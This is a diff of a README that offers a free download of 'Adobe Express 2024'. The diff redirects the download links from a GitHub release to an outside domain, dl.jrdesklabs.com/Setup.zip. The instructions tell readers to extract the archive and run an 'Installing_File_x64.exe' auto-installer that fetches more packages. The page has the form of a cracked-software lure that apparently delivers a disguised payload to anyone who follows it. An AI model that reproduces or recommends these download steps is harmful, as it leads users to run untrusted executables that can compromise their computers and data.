@@ -10,11 +10,11 @@ Tags: Adobe Express 2024 free. Download Adobe Express for free. download free Ad
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/82c61327-60ac-48e9-9d68-307db39ef217)
-](https://github.com/subrahmanyaug/Adobe-Animate-2024/releases/download/V4.59/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/subrahmanyaug/Adobe-Animate-2024/releases/download/V4.59/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![1Eb3bR5](https://github.com/user-attachments/assets/393e86d9-178a-424a-b15d-b3f28e956b94)
